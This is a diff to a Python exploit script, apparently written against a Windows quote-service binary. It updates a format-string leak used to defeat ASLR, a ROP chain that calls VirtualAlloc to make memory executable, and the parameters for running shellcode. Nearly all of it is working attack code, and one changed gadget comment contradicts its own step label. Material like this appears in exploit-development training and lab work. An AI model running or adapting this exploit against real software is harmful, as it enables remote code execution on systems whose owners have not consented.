@@ -49,7 +49,7 @@ def bad_request(buf):
 print("[+] Getting base address...")
 
 quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
-base_str = get_quote(quote_id).split(b" ")[8].decode()
+base_str = get_quote(quote_id).split(b" ")[2].decode()
 base = (int(base_str, 16) // 0x10000) * 0x10000
 
 print("    -- " + hex(base))
@@ -95,54 +95,54 @@ shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
 
 rop = [
 # 1. Get ESP (in eax)
-    base + 0x2610, # xor eax, eax ; ret
-    base + 0x1eb1, # or eax, esp ; ret
+    base + 0x25c0, # xor eax, eax ; ret
+    base + 0x1e69, # or eax, esp ; ret
 
 # 2. Get dummy call addr (in ebx)
-    base + 0x2b88, # pop ecx ; ret
+    base + 0x2b38, # pop ecx ; ret
     0x1ec, # eax + ? = dummy call
-    base + 0x9b86, # add eax, ecx ; pop ebx ; ret
+    base + 0x9b36, # add eax, ecx ; pop ebx ; ret
     0xffffffff, # junk for pop ebx
-    base + 0x1ebb, # mov ebx, eax ; ret
+    base + 0x1e73, # mov ebx, eax ; ret
 
 # 3. Deref virtualAlloc (in eax)
-    base + 0x2b87, # pop eax ; pop ecx ; ret
-    base + 0x4321c, # base + iat + virtualalloc
+    base + 0x2b37, # pop eax ; pop ecx ; ret
+    base + 0x43218, # base + iat + virtualalloc
     0xffffffff, # junk for pop ecx
-    base + 0x1eb4, # mov eax, [eax] ; add ecx, 0x5 ; pop edx ; ret
+    base + 0x1e6c, # mov eax, [eax] ; add ecx, 0x5 ; pop edx ; ret
     0xffffffff, # junk for pop edx
 
 # 4. Write virtual alloc to dummy
-    base + 0x1ec2, # mov [ebx], eax ; ret
+    base + 0x1e7a, # mov [ebx], eax ; ret
 
 # 5. Get shellcode addr (in eax)
-    base + 0x1ec5, # xchg edx, ebx ; cmp ebx, eax ; ret
-    base + 0x2d3c, # mov eax, edx ; ret
-    base + 0x2b88, # pop ecx ; ret
+    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+    base + 0x2cec, # mov eax, edx ; ret
+    base + 0x2b38, # pop ecx ; ret
     0x18, # eax + ? = dummy call
-    base + 0x9b86, # add eax, ecx ; pop ebx ; ret
+    base + 0x9b36, # add eax, ecx ; pop ebx ; ret
     0xffffffff, # junk for pop ebx
-    base + 0x1ec5, # xchg edx, ebx ; cmp ebx, eax ; ret
+    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
 
 # 6. Get dummy call addr + 0x4 (in ebx)
-    base + 0x1eca, # add ebx, 0x4 ; ret
+    base + 0x1e82, # add ebx, 0x4 ; ret
 
 # 7. Write shellcode addr to dummy + 0x4
-    base + 0x1ec2, # mov [ebx], eax ; ret
+    base + 0x1e7a, # mov [ebx], eax ; ret
 
 # 8. Get dummy call addr + 0x8 (in ebx)
-    base + 0x1eca, # add ebx, 0x8 ; ret
+    base + 0x1e82, # add ebx, 0x4 ; ret
 
 # 9. Write shellcode addr to dummy + 0x8
-    base + 0x1ec2, # mov [ebx], eax ; ret
+    base + 0x1e7a, # mov [ebx], eax ; ret
 
 # 10. Align esp with dummy call (ebx-8)
-    base + 0x1ec5, # xchg edx, ebx ; cmp ebx, eax ; ret
-    base + 0x2b88, # pop ecx ; ret
+    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+    base + 0x2b38, # pop ecx ; ret
     0xfffffff8, # edx + ? = dummy call
-    base + 0x1ece, # add edx, ecx ; ret
-    base + 0x1ec5, # xchg edx, ebx ; cmp ebx, eax ; ret
-    base + 0x1ebe, # xchg ebx, esp ; dec ecx ; ret
+    base + 0x1e86, # add edx, ecx ; ret
+    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
+    base + 0x1e76, # xchg ebx, esp ; dec ecx ; ret
 ]
 rop = b"".join([pack("<I", r) for r in rop])
 
@@ -151,7 +151,7 @@ rop = b"".join([pack("<I", r) for r in rop])
 dummy  = b"aaaa" # VirtualAlloc
 dummy += b"bbbb" # return <- shellcode addr
 dummy += b"cccc" # lpAddress <- shellcode addr
-dummy += pack("<I", 0x1) # dwSize <- 0x1
+dummy += pack("<I", 0x200) # dwSize <- 0x1
 dummy += pack("<I", 0x1000) # flAllocationType <- 0x1000
 dummy += pack("<I", 0x40) # flProtect <- 0x40
 
